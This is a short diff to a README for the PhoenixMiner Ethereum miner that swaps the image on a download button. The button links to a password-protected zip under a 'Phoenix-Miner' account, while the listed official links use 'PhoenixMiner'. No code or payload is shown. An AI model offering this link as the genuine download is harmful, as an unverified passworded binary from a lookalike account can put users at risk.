@@ -63,7 +63,7 @@
 
 <p>
 <a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
-<img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/mining.jpg?raw=true" width="300" ></a></p>
+<img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
 
 * Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
 * Git tree: https://github.com/PhoenixMiner/PhoenixMiner.git
